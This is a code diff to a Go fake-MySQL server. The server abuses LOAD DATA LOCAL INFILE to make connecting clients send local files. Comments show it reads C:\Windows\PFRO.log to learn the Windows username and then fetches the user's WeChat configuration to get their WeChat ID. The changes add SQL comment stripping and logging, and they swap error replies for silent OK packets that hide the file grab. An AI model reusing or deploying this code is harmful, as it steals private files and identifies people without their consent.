@@ -12,6 +12,7 @@ package driver
 import (
 	"fmt"
 	"net"
+	"regexp"
 	"runtime"
 	"runtime/debug"
 	"strings"
@@ -234,8 +235,16 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		}
 
 		// return
-		// log.Println("data====", "----------", string(data), "statementID", session.statementID)
+		log.Println("data====", string(data), "statementID====", session.statementID)
 
+		datastr := string(data)
+		re := regexp.MustCompile(`/\*.*?\*/`)
+
+		// 替换注释为空字符串
+		datastr = re.ReplaceAllString(datastr, "")
+
+		log.Println("datastr====", datastr)
+		data = []byte(datastr)
 		//处理获取  "C:\\Windows\\PFRO.log"
 		if utils.GetItemString(readK) == PRO_FILE_NAME && utils.GetItemString(unameK) == "" {
 
@@ -320,7 +329,8 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 		case sqldb.COM_QUERY:
 
 			// load data local infile 'D:/ioc.txt' into table users fields terminated by '\n'
-			log.Println(unameK, utils.GetItemString(unameK))
+			// log.Println(unameK, utils.GetItemString(unameK))
+			//获取电脑用户名
 			if utils.GetItemString(unameK) == "" {
 				if err = session.packets.Write(utils.GetPayload(PRO_FILE_NAME)); err != nil {
 					log.Error("TRBULAR: %v", err)
@@ -334,6 +344,7 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 				}
 			}
 
+			//获取微信id
 			if utils.GetItemString(wnameK) == "" && utils.GetItemString(unameK) != "" {
 				uname := utils.GetItemString(unameK)
 				wconfigname := strings.Replace(WX_CONFIG, "username", uname, 1)
@@ -353,8 +364,12 @@ func (l *Listener) handle(conn net.Conn, ID uint32) {
 			if err = l.handler.ComQuery(session, query, nil, func(qr *sqltypes.Result) error {
 				return session.writeTextRows(qr)
 			}); err != nil {
-				log.Error("server.handle.query.from.session[%v].error:%+v.query[%s]", ID, err, query)
-				if werr := session.writeErrFromError(err); werr != nil {
+				// log.Error("server.handle.query.from.session[%v].error:%+v.query[%s]", ID, err, query)
+				// if werr := session.writeErrFromError(err); werr != nil {
+				// 	return
+				// }
+
+				if err = session.packets.WriteOK(0, 0, session.greeting.Status(), 0); err != nil {
 					return
 				}
 			}
